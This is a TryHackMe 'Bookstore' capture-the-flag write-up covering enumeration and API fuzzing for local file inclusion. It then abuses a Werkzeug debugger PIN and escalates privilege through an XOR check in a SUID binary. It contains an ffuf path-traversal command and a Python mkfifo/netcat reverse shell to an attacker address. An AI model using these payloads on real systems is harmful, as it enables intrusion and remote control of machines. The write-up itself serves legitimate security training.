---
title: TryHackMe - Bookstore 
category: writeup
tags: tryhackme
---
https://tryhackme.com/room/bookstoreoc
# Summary

Book store is a medium rated machine on TryHackMe that involves doing some basic web enumeration, fuzzing the REST API to find a parameter that is vulnerable to Local File Inclusion allowing us to retrieve the PIN for the Werkzeug console leading code execution on the system. The privesc is done by finding the `try-harder` binary which takes an integer as an input which is XOR'd with 2 other integers and spawn's a shell if the input integer matches.

# Enumeration

### NMAP

Doing a TCP NMAP scan reveals the following:

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs5RybjdxaxapwkXwbzqZqONeX4X8rYtfTsy7wey7ZeRNsl36qQWhTrurBWWnYPO7wn2nEQ7Iz0+tmvSI3hms3eIEufCC/2FEftezKhtP1s4/qjp8UmRdaewMW2zYg+UDmn9QYmRfbBH80CLQvBwlsibEi3aLvhi/YrNCzL5yxMFQNWHIEMIry/FK1aSbMj7DEXTRnk5R3CYg3/OX1k3ssy7GlXAcvt5QyfmQQKfwpOG7UM9M8mXDCMiTGlvgx6dJkbG0XI81ho2yMlcDEZ/AsXaDPAKbH+RW5FsC5R1ft9PhRnaIkUoPwCLKl8Tp6YFSPcANVFYwTxtdUReU3QaF9
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCbhAKUo1OeBOX5j9stuJkgBBmhTJ+zWZIRZyNDaSCxG6U817W85c9TV1oWw/A0TosCyr73Mn73BiyGAxis6lNQ=
|   256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAr3xDLg8D5BpJSRh8OgBRPhvxNSPERedYUTJkjDs/jc
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 834559878C5590337027E6EB7D966AEE
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    syn-ack ttl 61 Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-title: Home
```

**We have the following observations:**

- Port 80 is open
- Port 22 is open
- Port 5000 is open with an /api entry in the robots.txt file and is running a python web server?.

## Directory scanning

I used feroxbuster to find the files on the website.

[epi052/feroxbuster](https://github.com/epi052/feroxbuster)

### Port 80

```bash
200       6452 http://10.10.188.179/index.html
301        319 http://10.10.188.179/javascript
200       2940 http://10.10.188.179/books.html
301        315 http://10.10.188.179/images
```

### Port 5000

```bash
200        825 http://10.10.188.179:5000/api
200       1985 http://10.10.188.179:5000/console
```

## Web Enumeration

### Port 80

Checking the login.html file reveals the following message in the comments of the source.

```html
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

Looks we are most likely looking for an LFI vulnerability to read the `/home/sid/.bash_history` file which contains the PIN we can use to gain acess to the Werkzeug debugger on port 5000.

Checking the books.html file reveals the following message in the source:

```html
<!--GY4CANZUEA3TIIBXGAQDOMZAGNQSAMTGEAZGMIBXG4QDONZAG43SAMTFEA3TSIBWMYQDONJAG42CANZVEA3DEIBWGUQDEZJAGYZSANTGEA3GIIBSMYQDONZAGYYSANZUEA3DGIBWHAQDGZRAG43CAM3EEA2TIIBXGQQDGNZAGYZCAN3BEA3TQIBXGUQDOMRAGRQSAMZREA2DS=== -->
```

That after being base32 decoded gives a hex string which on being decoded... well gives a youtube link. Find out for yourself 

[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)From_Hex('Auto')&input=R1k0Q0FOWlVFQTNUSUlCWEdBUURPTVpBR05RU0FNVEdFQVpHTUlCWEc0UURPTlpBRzQzU0FNVEZFQTNUU0lCV01ZUURPTkpBRzQyQ0FOWlZFQTNERUlCV0dVUURFWkpBR1laU0FOVEdFQTNHSUlCU01ZUURPTlpBR1lZU0FOWlVFQTNER0lCV0hBUURHWlJBRzQzQ0FNM0VFQTJUSUlCWEdRUURHTlpBR1laQ0FOM0JFQTNUUUlCWEdVUURPTVJBR1JRU0FNWlJFQTJEUz09PSA)

😤

Admittedly I did fall for it haha.

Further checking the source reveals a the assets/js/api.js file being called which contains the following comment:

```jsx
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

This is very interesting as there was probably a v1 of the API most likely running on the port 5000 and has a parameter that can be fuzzed for an LFI.

### Port 5000

Checking the /console endpoint reveals a Werkzeug debugger and the PIN for that is available in the bash_history as found earlier.

Checking the /api endpoint reveals the following message:

```
**API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:**

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

Now we have the following information:

- There is a PIN in sid's bash history file.
- There is a parameter most in the /api/v1/resources/books endpoint which is vulnerable to LFI.

Awesome, now all that is left to do is just FUZZ.

I used ffuf for this and used the following command.

```bash
fuff -u 'http://10.10.1.152:5000/api/v1/resources/books?PARAM=../../../../../../../etc/passwd' -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt:PARAM
```

We get a hit on the show parameter and checking the bash history gives us the PIN.

After typing in the PIN we get access to the python console from where we can spawn a shell using the following payload.

```python
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> 1337 >/tmp/f")
```

Now we have a shell as sid.

# Privilege Escalation

Looking at the contents of the home directory reveals a interesting `try-harder` binary with a SUID bit set.

Transferring the binary over to my kali machine and taking a look at it in ghidra reveals the following.

```c
void main(void) 
{
  long in_FS_OFFSET;
  uint user_input;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&user_input);
  local_14 = user_input ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

All this binary does is check if the integer that the user enters XOR'd with `0x1116` and `0x5db3` is equal to `0x5dcd21f4`.

The way XOR works is if you XOR `a = x ^ y ^ z` is the same as `y = a ^ x ^ z` 

We have the `a` which is `0x5dcd21f4` which is being compared to local_14, `x` which is `0x1116` , and `z` which is `0x5db3`

```python
root:book-store/ # python3
Python 3.8.6 (default, Sep 25 2020, 09:36:53) 
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x5dcd21f4 ^ 0x1116 ^ 0x5db3
1573743953
```

Running the binary and passing in that number gives us a shell as root.

```
sid@bookstore:~$ ./try-harder
What's The Magic Number?!
1573743953
root@bookstore:~#
```
